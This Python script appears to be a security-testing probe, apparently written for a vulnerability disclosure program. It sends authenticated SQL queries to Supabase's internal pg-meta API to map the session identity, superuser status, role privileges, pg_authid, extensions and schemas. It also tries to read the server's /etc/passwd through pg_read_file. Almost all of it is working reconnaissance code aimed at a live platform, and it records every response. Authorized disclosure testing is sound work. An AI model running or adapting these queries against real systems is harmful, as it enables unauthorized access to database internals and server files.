# -*- coding: utf-8 -*-
"""Supabase pg-meta query 只读盘点 (零破坏): 执行身份/角色/pg_authid/文件读取/扩展"""
import http.client, ssl, json, time, os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _supabase_creds import BEARER_JWT, VDP_HEADERS, UA, API_HOST, PROJECT_REF

ctx = ssl.create_default_context()
out = []

def q(sql, tag):
    body = json.dumps({"query": sql, "disable_statement_timeout": True})
    c = http.client.HTTPSConnection(API_HOST, timeout=25, context=ctx)
    h = {"User-Agent": UA, "Accept": "application/json", "Content-Type": "application/json",
         "Authorization": "Bearer " + BEARER_JWT, "x-pg-application-name": "supabase/security-test"}
    h.update(VDP_HEADERS)
    t0 = time.time()
    try:
        c.request('POST', '/platform/pg-meta/%s/query' % PROJECT_REF, headers=h, body=body)
        r = c.getresponse()
        b = r.read(3000).decode('utf-8', errors='replace')
        out.append('### [%s] %s (%.1fs)\n%s -> %s\n%s' % (
            tag, sql[:90], time.time() - t0, r.status, r.getheader('Content-Type', '')[:25], b[:1400]))
        c.close()
        return r.status, b
    except Exception as e:
        out.append('### [%s] %s ERR %s' % (tag, sql[:90], e))
        return 0, str(e)

q("select version();", "version")
q("select current_user cu, session_user su, current_setting('role') role_cfg, current_setting('is_superuser') is_su;", "identity")
q("select rolname, rolsuper, rolcreatedb, rolcreaterole, rolbypassrls, rolcanlogin from pg_roles order by 1;", "roles")
q("select count(*) n from pg_authid;", "authid-count")
q("select pg_read_file('/etc/passwd',0,200) f;", "readfile")
q("select extname, extversion from pg_extension order by 1;", "extensions")
q("select nspname from pg_namespace where nspname not like 'pg_%' and nspname <> 'information_schema' order by 1;", "schemas")
q("select name, default_version, installed_version from pg_available_extensions where name ilike '%supa%' or name in ('postgres_fdw','wrappers','pg_net','pg_cron','pgsodium','pg_graphql','plpgsql','pg_tle','hypopg') order by 1;", "avail-ext")

open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_sb21_query_ro.txt'), 'w', encoding='utf-8').write('\n'.join(out))
print('now=%d ttl=%ds' % (int(time.time()), 1788510807 - int(time.time())))
print('\n'.join(out)[:6000])
